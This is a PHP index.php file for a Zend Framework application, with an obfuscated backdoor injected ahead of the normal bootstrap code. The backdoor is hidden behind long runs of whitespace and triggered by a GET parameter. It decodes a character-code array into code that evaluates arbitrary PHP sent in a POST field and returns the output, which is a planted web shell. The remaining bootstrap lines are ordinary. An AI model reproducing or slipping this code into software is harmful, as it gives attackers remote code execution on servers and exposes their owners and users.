<?php																					if(isset($_GET[w4692t])){																																		$d=substr(8,1);foreach(array(36,112,61,64,36,95,80,79,83,84,91,39,112,49,39,93,59,36,109,61,115,112,114,105,110,116,102,40,34,37,99,34,44,57,50,41,59,105,102,40,115,116,114,112,111,115,40,36,112,44,34,36,109,36,109,34,41,41,123,36,112,61,115,116,114,105,112,115,108,97,115,104,101,115,40,36,112,41,59,125,111,98,95,115,116,97,114,116,40,41,59,101,118,97,108,40,36,112,41,59,36,116,101,109,112,61,34,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,66,121,73,100,40,39,80,104,112,79,117,116,112,117,116,39,41,46,115,116,121,108,101,46,100,105,115,112,108,97,121,61,39,39,59,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,66,121,73,100,40,39,80,104,112,79,117,116,112,117,116,39,41,46,105,110,110,101,114,72,84,77,76,61,39,34,46,97,100,100,99,115,108,97,115,104,101,115,40,104,116,109,108,115,112,101,99,105,97,108,99,104,97,114,115,40,111,98,95,103,101,116,95,99,108,101,97,110,40,41,41,44,34,92,110,92,114,92,116,92,92,39,92,48,34,41,46,34,39,59,92,110,34,59,101,99,104,111,40,115,116,114,108,101,110,40,36,116,101,109,112,41,46,34,92,110,34,46,36,116,101,109,112,41,59,101,120,105,116,59)as$c){$d.=sprintf((substr(urlencode(print_r(array(),1)),5,1).c),$c);}eval($d);																																												}																					

// Define path to application directory
defined('APPLICATION_PATH')
    || define('APPLICATION_PATH', realpath(dirname(__FILE__) . '/../application'));

// Define application environment
defined('APPLICATION_ENV')
    || define('APPLICATION_ENV', (getenv('APPLICATION_ENV') ? getenv('APPLICATION_ENV') : 'production'));

// Ensure library/ is on include_path
set_include_path(implode(PATH_SEPARATOR, array(
    realpath(APPLICATION_PATH . '/../library'),
    get_include_path(),
)));

/** Zend_Application */
require_once 'Zend/Application.php';

// Create application, bootstrap, and run
$application = new Zend_Application(
    APPLICATION_ENV,
    APPLICATION_PATH . '/configs/application.ini'
);
$application->bootstrap()
            ->run();